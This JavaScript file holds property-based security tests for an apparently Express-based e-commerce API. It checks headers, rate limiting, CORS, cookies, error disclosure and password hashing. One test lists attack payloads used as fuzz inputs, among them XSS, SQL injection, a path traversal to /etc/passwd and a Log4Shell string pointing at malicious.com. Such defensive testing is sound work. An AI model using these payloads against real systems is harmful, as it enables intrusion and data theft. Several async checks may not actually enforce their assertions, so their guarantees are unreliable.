const { expect } = require('chai');
const fc = require('fast-check');
const request = require('supertest');
const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

/**
 * **Feature: ecommerce-modernization, Property 4: Security vulnerability elimination**
 * **Validates: Requirements 1.4**
 *
 * For any security audit performed on the system, there should be zero high or critical
 * security vulnerabilities reported
 */

describe('Property Test: Security Vulnerability Elimination', function () {
  let app;

  before(function () {
    // Load the Express app
    try {
      app = require('../../src/app');
    } catch (error) {
      // If app.js doesn't exist, try index.js
      app = require('../../index');
    }
  });

  it('should have zero high or critical npm audit vulnerabilities', function () {
    fc.assert(
      fc.property(fc.constant(true), () => {
        try {
          // Run npm audit and capture output
          const auditResult = execSync('npm audit --audit-level=high --json', {
            encoding: 'utf8',
            cwd: process.cwd(),
          });

          const auditData = JSON.parse(auditResult);

          // Check for high and critical vulnerabilities
          const highVulns = auditData.metadata?.vulnerabilities?.high || 0;
          const criticalVulns =
            auditData.metadata?.vulnerabilities?.critical || 0;

          expect(highVulns + criticalVulns).to.equal(
            0,
            `Found ${highVulns} high and ${criticalVulns} critical vulnerabilities`
          );

          return true;
        } catch (error) {
          // If npm audit fails with exit code 1, it means vulnerabilities were found
          if (error.status === 1) {
            try {
              const auditData = JSON.parse(error.stdout);
              const highVulns = auditData.metadata?.vulnerabilities?.high || 0;
              const criticalVulns =
                auditData.metadata?.vulnerabilities?.critical || 0;

              expect(highVulns + criticalVulns).to.equal(
                0,
                `Found ${highVulns} high and ${criticalVulns} critical vulnerabilities`
              );
            } catch (parseError) {
              throw new Error('Failed to parse npm audit output');
            }
          } else {
            throw error;
          }
          return true;
        }
      }),
      { numRuns: 100 }
    );
  });

  it('should implement security headers protection', function () {
    fc.assert(
      fc.property(
        fc.constantFrom('/api/products', '/api/users', '/api/orders'),
        async endpoint => {
          const response = await request(app).get(endpoint);

          // Should have security headers implemented by helmet
          const securityHeaders = [
            'x-content-type-options',
            'x-frame-options',
            'x-xss-protection',
          ];

          securityHeaders.forEach(header => {
            expect(response.headers).to.have.property(
              header,
              `Security header ${header} should be present`
            );
          });

          return true;
        }
      ),
      { numRuns: 100 }
    );
  });

  it('should protect against XSS attacks in response headers', function () {
    fc.assert(
      fc.property(
        fc.constantFrom('/api/products', '/api/users', '/api/orders'),
        async endpoint => {
          const response = await request(app).get(endpoint);

          // X-XSS-Protection header should be set
          expect(response.headers['x-xss-protection']).to.exist;

          // Content-Type-Options should prevent MIME sniffing
          expect(response.headers['x-content-type-options']).to.equal(
            'nosniff'
          );

          return true;
        }
      ),
      { numRuns: 100 }
    );
  });

  it('should implement rate limiting protection', function () {
    fc.assert(
      fc.property(
        fc.constantFrom('/api/products', '/api/users', '/api/orders'),
        async endpoint => {
          // Make multiple rapid requests to test rate limiting
          const requests = Array(10)
            .fill()
            .map(() => request(app).get(endpoint));
          const responses = await Promise.all(requests);

          // At least one response should include rate limit headers
          const hasRateLimitHeaders = responses.some(
            response =>
              response.headers['x-ratelimit-limit'] ||
              response.headers['ratelimit-limit'] ||
              response.headers['x-rate-limit-limit']
          );

          expect(hasRateLimitHeaders).to.be.true;

          return true;
        }
      ),
      { numRuns: 100 }
    );
  });

  it('should prevent clickjacking with X-Frame-Options', function () {
    fc.assert(
      fc.property(
        fc.constantFrom('/api/products', '/api/users', '/api/orders'),
        async endpoint => {
          const response = await request(app).get(endpoint);

          // X-Frame-Options should be set to prevent clickjacking
          expect(response.headers['x-frame-options']).to.exist;
          expect(response.headers['x-frame-options']).to.match(
            /DENY|SAMEORIGIN/
          );

          return true;
        }
      ),
      { numRuns: 100 }
    );
  });

  it('should implement proper CORS configuration', function () {
    fc.assert(
      fc.property(
        fc.constantFrom('/api/products', '/api/users', '/api/orders'),
        async endpoint => {
          const response = await request(app)
            .get(endpoint)
            .set('Origin', 'http://malicious-site.com');

          // CORS should be properly configured
          expect(response.headers['access-control-allow-origin']).to.exist;

          // Should not allow all origins in production-like settings
          if (process.env.NODE_ENV === 'production') {
            expect(
              response.headers['access-control-allow-origin']
            ).to.not.equal('*');
          }

          return true;
        }
      ),
      { numRuns: 100 }
    );
  });

  it('should reject malicious input patterns', function () {
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      '"; DROP TABLE users; --',
      '../../../etc/passwd',
      '${jndi:ldap://malicious.com/a}',
      '<img src=x onerror=alert(1)>',
      'javascript:alert(1)',
      '{{7*7}}',
      '<%=7*7%>',
    ];

    fc.assert(
      fc.property(
        fc.constantFrom(...maliciousInputs),
        fc.constantFrom('/api/products', '/api/users'),
        async (maliciousInput, endpoint) => {
          // Test malicious input in query parameters
          const response = await request(app).get(
            `${endpoint}?search=${encodeURIComponent(maliciousInput)}`
          );

          // Should not execute or reflect malicious input
          if (response.body && typeof response.body === 'string') {
            expect(response.body).to.not.include('<script>');
            expect(response.body).to.not.include('javascript:');
          }

          // Should handle malicious input gracefully (not crash)
          expect(response.status).to.be.within(200, 499);

          return true;
        }
      ),
      { numRuns: 100 }
    );
  });

  it('should implement secure session configuration', function () {
    fc.assert(
      fc.property(fc.constant(true), async () => {
        // Test session cookie security
        const response = await request(app)
          .post('/api/auth/login')
          .send({ username: 'test', password: 'test' });

        // Check for secure session cookies
        const setCookieHeader = response.headers['set-cookie'];
        if (setCookieHeader) {
          const cookieString = Array.isArray(setCookieHeader)
            ? setCookieHeader.join('; ')
            : setCookieHeader;

          // Session cookies should have security flags in production
          if (process.env.NODE_ENV === 'production') {
            expect(cookieString).to.match(/Secure/i);
            expect(cookieString).to.match(/HttpOnly/i);
          }
        }

        return true;
      }),
      { numRuns: 100 }
    );
  });

  it('should validate input data types and formats', function () {
    fc.assert(
      fc.property(
        fc.record({
          invalidEmail: fc.string().filter(s => !s.includes('@')),
          invalidNumber: fc.string().filter(s => isNaN(Number(s))),
          oversizedString: fc.string({ minLength: 10000 }),
        }),
        async invalidData => {
          // Test with invalid email
          const emailResponse = await request(app)
            .post('/api/users')
            .send({ email: invalidData.invalidEmail, name: 'Test' });

          // Should reject invalid email formats
          expect(emailResponse.status).to.be.within(400, 499);

          return true;
        }
      ),
      { numRuns: 100 }
    );
  });

  it('should implement proper error handling without information disclosure', function () {
    fc.assert(
      fc.property(
        fc.integer({ min: 999999, max: 9999999 }), // Non-existent ID
        async nonExistentId => {
          const response = await request(app).get(
            `/api/products/${nonExistentId}`
          );

          // Error responses should not disclose sensitive information
          if (response.body && response.body.message) {
            const errorMessage = response.body.message.toLowerCase();

            // Should not expose database details
            expect(errorMessage).to.not.include('sql');
            expect(errorMessage).to.not.include('database');
            expect(errorMessage).to.not.include('sequelize');
            expect(errorMessage).to.not.include('postgres');

            // Should not expose file system paths
            expect(errorMessage).to.not.include('/src/');
            expect(errorMessage).to.not.include('/node_modules/');
            expect(errorMessage).to.not.include('c:\\');
          }

          return true;
        }
      ),
      { numRuns: 100 }
    );
  });

  it('should implement secure password handling', function () {
    fc.assert(
      fc.property(
        fc.string({ minLength: 8, maxLength: 50 }),
        async password => {
          const response = await request(app).post('/api/users').send({
            email: 'test@example.com',
            password: password,
            name: 'Test User',
          });

          // Password should never be returned in response
          if (response.body && response.body.password) {
            expect(response.body.password).to.not.equal(password);
            // Should be hashed (bcrypt hashes start with $2b$)
            expect(response.body.password).to.match(/^\$2[aby]\$/);
          }

          return true;
        }
      ),
      { numRuns: 100 }
    );
  });
});
